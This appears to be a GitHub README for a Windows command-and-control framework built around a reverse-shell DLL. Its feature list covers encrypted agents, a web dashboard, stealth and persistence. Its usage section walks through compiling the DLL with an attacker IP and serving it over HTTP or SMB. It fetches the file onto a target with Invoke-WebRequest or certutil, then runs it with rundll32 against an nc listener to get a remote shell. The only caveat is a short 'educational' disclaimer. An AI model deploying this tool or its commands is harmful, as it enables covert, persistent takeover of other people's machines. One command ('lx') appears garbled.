# 🎯 Shell Reverse DLL - Windows C2 Framework

A complete Command & Control (C2) framework for Windows systems featuring encrypted communication, a web dashboard, and a reverse shell DLL payload.  

## Overview

This project provides a complete post-exploitation framework for Windows environments. It includes:

- **Reverse Shell DLL** - Malicious library that provides remote access
- **C2 Server** - Central command server with database backend
- **Encrypted Agent** - Python-based agent with RSA+AES encryption
- **Web Dashboard** - Modern web interface for agent management

## Features

✅ **Reverse Shell DLL** - Windows DLL that connects back to your C2 server  
✅ **RSA-2048 + AES-256 Encryption** - Secure communication channel  
✅ **Web Dashboard** - Real-time agent monitoring and control  
✅ **SQLite Database** - Persistent storage of agents and command history  
✅ **Multi-Agent Support** - Control multiple compromised machines simultaneously  
✅ **Command Queue** - Offline agents receive commands when reconnecting  
✅ **Stealth Mode** - Randomized heartbeats and realistic HTTP headers  
✅ **Persistence Ready** - Built-in commands for maintaining access  

## Project Structure

shell_reverse_dll/
├── c2/
│ ├── server.py # Main C2 server (Flask API)
│ ├── database.py # SQLite database handler
│ └── crypto.py # RSA/AES encryption management
├── agents/
│ ├── agent.py # Simple agent (no encryption)
│ ├── encrypted_agent.py # Encrypted agent (RSA+AES)
│ └── build.sh # PyInstaller compilation script
├── web/
│ ├── app.py # Flask web dashboard
│ └── templates/
│ └── dashboard.html # Web interface
├── dll/
│ ├── shell_reverse.c # Reverse shell DLL source
│ └── compile.sh # MinGW compilation script
└── requirements.txt # Python dependencies


## Prerequisites

### On Kali Linux (Attacker Machine)

```bash
# Required packages
sudo apt update
sudo apt install -y mingw-w64 python3 python3-pip

# Python dependencies
pip3 install -r requirements.txt

Installation
1. Clone the repository

git clone https://github.com/maykon92/shell_reverse_dll.git
cd shell_reverse_dll

2. Install Python dependencies

pip3 install -r requirements.txt

3. Make scripts executable

lx dll/compile.sh agents/build.sh

Usage
1. Start the C2 Server

cd c2
python3 server.py

2. Start the Web Dashboard
Open a new terminal:

cd web
python3 app.py

Access the dashboard at: http://<YOUR_KALI_IP>:5001

3. Compile the DLL Payload
First, edit the IP address in dll/shell_reverse.c:

#define REMOTE_IP "0.0.0.0"  // Change to your Kali IP
#define REMOTE_PORT 4444

Then compile:

cd dll
./compile.sh

This creates:

shell_reverse_x64.dll - For 64-bit Windows

shell_reverse_x86.dll - For 32-bit Windows

4. Deploy on Target Windows Machine
Method 1: HTTP Transfer (Recommended)
On Kali (serve the DLL):

python3 -m http.server 8000

On Windows (download):

# PowerShell
Invoke-WebRequest -Uri "http://<KALI_IP>:8000/shell_reverse_x64.dll" -OutFile "<FOLDER PATH>\shell.dll"

# OR using certutil
certutil -urlcache -f http://<KALI_IP>:8000/shell_reverse_x64.dll shell.dll

Method 2: SMB Share

# On Kali
sudo impacket-smbserver share $(pwd)

# On Windows
\\<KALI_IP>\share\shell_reverse_x64.dll

5. Execute the DLL
Start listener on Kali (first):

nc -lvnp 4444

On Windows:

rundll32.exe <FOLDER PATH>\shell.dll,RunShell

Legal Disclaimer
⚠️ WARNING: This tool is for educational purposes only and authorized security testing only.
Unauthorized access to computer systems is illegal. The author assumes no liability for misuse.
Always obtain explicit written permission before testing on any system you don't own.

License
This project is for educational and research purposes only.

Author
Maykon Da Luz
GitHub: @maykon92